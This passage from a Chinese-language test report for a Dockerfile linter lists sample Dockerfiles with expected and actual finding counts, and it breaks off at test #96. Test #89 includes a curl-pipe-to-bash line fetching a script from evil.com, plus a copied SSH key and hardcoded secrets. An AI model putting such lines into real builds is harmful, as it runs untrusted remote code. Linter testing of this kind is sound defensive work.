| 安全 (security) | 1 | ✅ |

**状态**: ✅ 通过

---

## 测试 #50: E001: ENV 包含 PASSWORD

**类别**: ENV

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENV DB_PASSWORD=mypassword
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 1 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 1 | ✅ |

**状态**: ✅ 通过

---

## 测试 #51: E001: ENV 包含多个敏感变量

**类别**: ENV

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENV API_KEY=abc123
ENV SECRET_TOKEN=xyz789
ENV AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 2 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 2 | ✅ |

**状态**: ✅ 通过

---

## 测试 #52: E001: ENV 使用变量引用不触发

**类别**: ENV

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENV API_KEY=${API_KEY_VALUE}
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #53: E002: ENV 重复定义

**类别**: ENV

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENV NODE_ENV=development
ENV NODE_ENV=production
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 4 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 4 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #54: E003: ARG 与 ENV 同名覆盖

**类别**: ENV

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ARG SECRET=default-secret
ENV SECRET=production-secret
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 1 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 1 | ✅ |

**状态**: ✅ 通过

---

## 测试 #55: A001: FROM 使用未定义的 ARG

**类别**: ARG

### Dockerfile 代码

```dockerfile
FROM node:${NODE_VERSION}-alpine
ARG NODE_VERSION=18
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #56: A001: ARG 在 FROM 前正确定义

**类别**: ARG

### Dockerfile 代码

```dockerfile
ARG NODE_VERSION=18
FROM node:${NODE_VERSION}-alpine
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #57: A002: ARG 跨阶段需重新定义

**类别**: ARG

### Dockerfile 代码

```dockerfile
ARG APP_VERSION=1.0

FROM node:18-alpine AS builder
RUN echo ${APP_VERSION}

FROM node:18-alpine
RUN echo ${APP_VERSION}
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #58: A002: ARG 跨阶段正确重新定义

**类别**: ARG

### Dockerfile 代码

```dockerfile
ARG APP_VERSION=1.0

FROM node:18-alpine AS builder
ARG APP_VERSION
RUN echo ${APP_VERSION}

FROM node:18-alpine
ARG APP_VERSION
RUN echo ${APP_VERSION}
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #59: A003: BUILD_VERSION 应使用 ARG

**类别**: ARG

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENV BUILD_VERSION=1.0.0
RUN npm run build
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #60: EX001: EXPOSE 端口超出范围

**类别**: EXPOSE

### Dockerfile 代码

```dockerfile
FROM nginx:alpine
EXPOSE 99999
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #61: EX001: EXPOSE 端口为 0

**类别**: EXPOSE

### Dockerfile 代码

```dockerfile
FROM nginx:alpine
EXPOSE 0
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #62: EX001: EXPOSE 无效端口格式

**类别**: EXPOSE

### Dockerfile 代码

```dockerfile
FROM nginx:alpine
EXPOSE abc
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #63: EX002: EXPOSE 重复端口

**类别**: EXPOSE

### Dockerfile 代码

```dockerfile
FROM nginx:alpine
EXPOSE 80
EXPOSE 80/tcp
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #64: EX003: EXPOSE 无效协议

**类别**: EXPOSE

### Dockerfile 代码

```dockerfile
FROM nginx:alpine
EXPOSE 80/http
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #65: EX003: EXPOSE 协议 sctp 无效

**类别**: EXPOSE

### Dockerfile 代码

```dockerfile
FROM nginx:alpine
EXPOSE 80/sctp
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #66: EXPOSE: 正确的 TCP 和 UDP

**类别**: EXPOSE

### Dockerfile 代码

```dockerfile
FROM nginx:alpine
EXPOSE 80/tcp 443/tcp 53/udp
CMD ["nginx"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #67: S001: SHELL 非数组格式

**类别**: SHELL

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
SHELL cmd /S /C
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #68: S001: SHELL 使用单引号

**类别**: SHELL

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
SHELL ['cmd', '/S', '/C']
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #69: S001: SHELL 括号不匹配

**类别**: SHELL

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
SHELL ["cmd", "/S", "/C"
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #70: S001: SHELL 正确格式

**类别**: SHELL

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
SHELL ["cmd", "/S", "/C"]
CMD ["node"]
USER node
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #71: ST001: STOPSIGNAL 无效信号名

**类别**: STOPSIGNAL

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
STOPSIGNAL INVALID
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #72: ST001: STOPSIGNAL 信号编号超出范围

**类别**: STOPSIGNAL

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
STOPSIGNAL 100
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #73: ST001: STOPSIGNAL 正确信号名

**类别**: STOPSIGNAL

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
STOPSIGNAL SIGTERM
CMD ["node"]
USER node
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #74: ST001: STOPSIGNAL 正确信号编号

**类别**: STOPSIGNAL

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
STOPSIGNAL 15
CMD ["node"]
USER node
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #75: X002: 缺少 USER 指令

**类别**: USER

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
WORKDIR /app
COPY . .
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 3 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 3 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #76: X002: USER root 最终以 root 运行

**类别**: USER

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
WORKDIR /app
USER node
COPY . .
USER root
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 4 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 4 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #77: X003: 先切换普通用户后切回 root

**类别**: USER

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
USER node
COPY . .
USER root
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 4 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 4 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #78: X004: COPY 在 WORKDIR 之前

**类别**: WORKDIR

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
COPY . .
WORKDIR /app
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 4 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 4 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #79: X005: 长期服务缺少 HEALTHCHECK

**类别**: HEALTHCHECK

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
EXPOSE 3000
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #80: X005: 有 HEALTHCHECK 不触发

**类别**: HEALTHCHECK

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
EXPOSE 3000
HEALTHCHECK --interval=30s CMD curl -f http://localhost:3000/ || exit 1
CMD ["node", "server.js"]
USER node
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #81: X006: 连续 RUN 指令应合并

**类别**: RUN

### Dockerfile 代码

```dockerfile
FROM alpine:3.18
RUN apk add --no-cache curl
RUN apk add --no-cache wget
RUN rm -rf /var/cache/*
CMD ["sh"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 2 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 2 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #82: X007: 连续空行过多

**类别**: Format

### Dockerfile 代码

```dockerfile
FROM node:18-alpine



WORKDIR /app
CMD ["node"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #83: X011: 非 root 用户 COPY 权限风险

**类别**: COPY

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
COPY . /app
USER node
CMD ["node", "/app/server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 2 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 2 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #84: X008: Final stage 包含构建工具 gcc

**类别**: StageResidue

### Dockerfile 代码

```dockerfile
FROM node:18-alpine AS builder
RUN npm install && npm run build

FROM node:18-alpine
COPY --from=builder /app/dist /app
RUN apk add --no-cache gcc g++ make
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 2 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 2 | ✅ |

**状态**: ✅ 通过

---

## 测试 #85: X009: Final stage 复制敏感文件

**类别**: StageResidue

### Dockerfile 代码

```dockerfile
FROM node:18-alpine AS builder
COPY .env /app/.env
RUN npm run build

FROM node:18-alpine
COPY --from=builder /app /app
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #86: X010: Final stage 包含 npm 工具

**类别**: StageResidue

### Dockerfile 代码

```dockerfile
FROM node:18-alpine AS builder
RUN npm install && npm run build

FROM node:18-alpine
COPY --from=builder /app/dist /app
RUN apk add --no-cache npm
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #87: 组合: 多个错误同时存在

**类别**: Combined

### Dockerfile 代码

```dockerfile
FROM ubuntu:latest
ENV API_KEY=secret
RUN apt-get update
RUN apt-get install curl
COPY .env /app/
EXPOSE 99999
CMD node app.js
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 5 |
| 信息 (info) | 3 |
| 安全 (security) | 1 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 5 | ✅ |
| 信息 (info) | 3 | ✅ |
| 安全 (security) | 1 | ✅ |

**状态**: ✅ 通过

---

## 测试 #88: 组合: 多阶段构建中的多个问题

**类别**: Combined

### Dockerfile 代码

```dockerfile
FROM node:latest AS builder
WORKDIR /app
COPY . .
RUN npm install

FROM node:latest
COPY --from=nonexistent /app /app
ENV SECRET=password
CMD ['node', 'server.js']
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 2 |
| 警告 (warning) | 2 |
| 信息 (info) | 2 |
| 安全 (security) | 1 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 2 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 2 | ✅ |
| 安全 (security) | 1 | ✅ |

**状态**: ✅ 通过

---

## 测试 #89: 组合: 安全问题叠加

**类别**: Combined

### Dockerfile 代码

```dockerfile
FROM ubuntu:20.04
ENV AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
ENV DB_PASSWORD=mypassword
COPY id_rsa /root/.ssh/id_rsa
COPY .env /app/.env
RUN chmod 777 /app
RUN curl -sSL https://evil.com/install.sh | bash
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 4 |
| 信息 (info) | 1 |
| 安全 (security) | 2 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 4 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 2 | ✅ |

**状态**: ✅ 通过

---

## 测试 #90: 组合: 正确的最佳实践 Dockerfile

**类别**: Combined

### Dockerfile 代码

```dockerfile
ARG NODE_VERSION=18

FROM node:${NODE_VERSION}-alpine AS builder
ARG NODE_VERSION
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:${NODE_VERSION}-alpine AS runner
ARG NODE_VERSION
WORKDIR /app
COPY --from=builder --chown=node:node /app/node_modules ./node_modules
COPY --chown=node:node . .
EXPOSE 3000
HEALTHCHECK --interval=30s CMD curl -f http://localhost:3000/ || exit 1
USER node
CMD ["node", "server.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 2 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 2 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #91: 边缘: 空 Dockerfile

**类别**: Edge

### Dockerfile 代码

```dockerfile

```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #92: 边缘: 只有注释

**类别**: Edge

### Dockerfile 代码

```dockerfile
# 这是一个注释
# 没有 FROM
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 1 |
| 警告 (warning) | 0 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 1 | ✅ |
| 警告 (warning) | 0 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #93: 边缘: 多行 RUN 指令

**类别**: Edge

### Dockerfile 代码

```dockerfile
FROM ubuntu:20.04
RUN apt-get update &&     apt-get install -y curl wget &&     rm -rf /var/lib/apt/lists/*
CMD ["bash"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #94: 边缘: 带引号的 ENV 值

**类别**: Edge

### Dockerfile 代码

```dockerfile
FROM node:18-alpine
ENV NODE_ENV="production"
ENV PATH="/app/bin:${PATH}"
CMD ["node", "app.js"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 2 |
| 信息 (info) | 0 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 2 | ✅ |
| 信息 (info) | 0 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #95: 边缘: EXPOSE 多个端口

**类别**: Edge

### Dockerfile 代码

```dockerfile
FROM nginx:alpine
EXPOSE 80 443 8080/tcp 8443/tcp 53/udp
CMD ["nginx"]
```

### 预期结果

| 严重级别 | 数量 |
|----------|------|
| 错误 (error) | 0 |
| 警告 (warning) | 1 |
| 信息 (info) | 1 |
| 安全 (security) | 0 |

### 实际结果

| 严重级别 | 数量 | 匹配 |
|----------|------|------|
| 错误 (error) | 0 | ✅ |
| 警告 (warning) | 1 | ✅ |
| 信息 (info) | 1 | ✅ |
| 安全 (security) | 0 | ✅ |

**状态**: ✅ 通过

---

## 测试 #96: 边缘: Windows 风格 SHELL

**类别**: Edge

### Dockerfile 代码

```dockerfile
FROM mcr.microsoft.com/windows/servercore:ltsc2022
SHELL ["powershell", "-Command"]
USER ContainerUser
CMD ["cmd"]
```

### 预期结果

